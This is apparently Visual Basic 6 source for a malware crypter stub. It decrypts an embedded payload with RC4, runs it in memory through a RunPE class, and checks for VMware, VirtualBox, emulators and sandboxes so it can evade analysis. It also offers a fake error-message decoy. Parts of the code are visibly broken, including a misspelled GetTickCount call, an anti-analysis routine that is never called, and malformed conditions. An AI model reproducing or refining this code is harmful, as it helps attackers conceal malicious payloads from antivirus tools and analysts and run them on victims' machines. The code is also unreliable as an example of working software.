Attribute VB_Name = "modMain"
Private Declare Sub Sleep Lib "kernel32" (ByVal lngMilliseconds As Long)
Private Declare Function GetTickCount Lib "kernel32" () As Long
Private Declare Function GetModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As Long
Const sSplit = "!@#@!"
Const sSection = "Test"
Dim cClazz As cClass

Sub Main()
    Dim cRPE            As New cPEL
    Dim bVMWare         As Boolean
    Dim bEmulators      As Boolean
    Dim bSandboxes      As Boolean
    Dim bVirtualBox     As Boolean
    Dim bFakeMessage    As Boolean
    Dim sKey            As String
    Dim sTitle          As String
    Dim sMessage        As String
    Dim sFile           As String
    Dim bFile()         As Byte

    If Not DoGetSettings(bVMWare, bEmulators, bSandboxes, bVirtualBox, bFakeMessage, sKey, sTitle, sMessage, sFile) Then Exit Sub
    
    sFile = DecryptFile(sFile, sKey)
    bFile() = StrConv(sFile, vbFromUnicode)
    cRPE.RunPE bFile()
End Sub

Private Function DoGetSettings(ByRef VMWare As Boolean, ByRef Emulators As Boolean, ByRef Sandboxes As Boolean, ByRef VirtualBox As Boolean, ByRef FakeMessage As Boolean, ByRef Key As String, ByRef Title As String, Message As String, sFile As String) As Boolean
    On Error GoTo ErrHandler
    Dim sTemp() As String
    sTemp() = Split(GetSettings(sSection), sSplit)
    
    sFile = sTemp(1)
    VMWare = IsBoolean(sTemp(2))
    Emulators = IsBoolean(sTemp(3))
    Sandboxes = IsBoolean(sTemp(4))
    VirtualBox = IsBoolean(sTemp(5))
    Key = sTemp(6)
    FakeMessage = IsBoolean(sTemp(7))
    Title = sTemp(8)
    Message = sTemp(9)
    
    DoGetSettings = True
    Exit Function
    
ErrHandler:
    DoGetSettings = False
End Function

Private Function IsBoolean(sString As String) As Boolean
    If sString = "0" Then
        IsBoolean = False
    Else
        IsBoolean = True
    End If
End Function

Private Function DecryptFile(sFile As String, sKey As String) As String
    Dim bTemp()     As Byte
    Dim bPass()     As Byte
    Dim sTemp       As String
    Set cClazz = New cClass
    
    sFile = RC4(sFile, sKey)
    bTemp() = StrConv(sFile, vbFromUnicode)
    bPass() = StrConv(sKey, vbFromUnicode)
    bTemp() = cClazz.DecryptData(bTemp(), bPass())
    DecryptFile = StrConv(bTemp(), vbUnicode)
End Function
    
Private Sub CheckAntis(bVMWare As Boolean, bEmulators As Boolean, bVirtualBox As Boolean, bFakeMessage As Boolean, sMessage As String, sTitle As String)
    If bVMWare Then
        If IsVM(0) Then
            MsgBox "Caused exception at 0x44e85c", vbCritical, "Emulator"
            End
        End If
    End If
    
    If bEmulators Then
        If IsEmulator Then
            MsgBox "Caused exception at 0x44e85c", vbCritical, "Emulator"
            End
        End If
    End If
    
    If bVirtualBox Then
        If IsVM(1) Then
            MsgBox "Caused exception at 0x44e85c", vbCritical, "Emulator"
            End
        End If
    End If
    
    If bSandboxes Then
        If IsSandbox Then
            MsgBox "Caused exception at 0x44e85c", vbCritical, "Emulator"
            End
        End If
    End If
    
    If bFakeMessage Then
        MsgBox sMessage, vbCritical, sTitle
    End If
End Sub

Public Function IsEmulator() As Boolean
    Dim lNow As Long
    Dim lAfter As Long
    
    lNow = gettickcont
    Call Sleep(500)
    lAfter = GetTickCount
    
    If lAfter - lNow < 500 Then
        IsEmulator = True
    Else
        IsEmulator = False
    End If
End Function

Public Function IsSandbox() As Boolean
    If Environ("username") = "currentuser" Then
        IsSandbox = True
        Exit Function
    End If
    
    If App.Path = "C:\" & App.EXEName = "file" Then
        IsSandbox = True
        Exit Function
    End If
    
    If App.EXEName = "Sample" Or Environ("username") = "andy" Or "Andy" Then
        IsSandbox = True
        Exit Function
    End If
    
    If App.Path = "C:\" Or "D:\" Or "F:\" Or "F:\" & Environ("username") = "Schimdti" Then
        IsSandbox = True
        Exit Function
    End If
End Function

Public Function IsVM(wO As Integer) As Boolean
    Dim sVController                As String
    Dim vWmi                        As Variant
    Dim vItems                      As Variant
    Dim vObjItem                    As Variant
    
    Set vWmi = GetObject("winmgmts:{impersonationLevel=impersonate)!\\.\root\cimv2")
    Set vItems = vWmi.execquery("Select * from Win32_VideoController", , 48)
    
    For Each vObjItem In vItems
        sVController = sVController & vObjItem.Description & vObjItem.AdapterCompatibility & vObjItem.Name & vObjItem.VideoProcessor
    Next
    
    Select Case wO
        Case 0
            If InStr(1, sVController, "VMware SVGA II") Then
                IsVM = True
            Else
                IsVM = False
            End If
        Case 1
            If InStr(1, sVController, "VirtualBox Graphics Adapter") Then
                IsVM = True
            Else
                IsVM = False
            End If
    End Select
End Function

Public Function RC4(ByVal Expression As String, ByVal Password As String) As String
    On Error Resume Next
    Dim RB(0 To 255) As Integer, x As Long, Y As Long, Z As Long, Key() As Byte, ByteArray() As Byte, Temp As Byte
    If Len(Password) = 0 Then
        Exit Function
    End If
    If Len(Expression) = 0 Then
        Exit Function
    End If
    If Len(Password) > 256 Then
        Key() = StrConv(Left$(Password, 256), vbFromUnicode)
    Else
        Key() = StrConv(Password, vbFromUnicode)
    End If
    For x = 0 To 255
        RB(x) = x
    Next x
    x = 0
    Y = 0
    Z = 0
    For x = 0 To 255
        Y = (Y + RB(x) + Key(x Mod Len(Password))) Mod 256
        Temp = RB(x)
        RB(x) = RB(Y)
        RB(Y) = Temp
    Next x
    x = 0
    Y = 0
    Z = 0
    ByteArray() = StrConv(Expression, vbFromUnicode)
    For x = 0 To Len(Expression)
        Y = (Y + 1) Mod 256
        Z = (Z + RB(Y)) Mod 256
        Temp = RB(Y)
        RB(Y) = RB(Z)
        RB(Z) = Temp
        ByteArray(x) = ByteArray(x) Xor (RB((RB(Y) + RB(Z)) Mod 256))
    Next x
    RC4 = StrConv(ByteArray, vbUnicode)
End Function

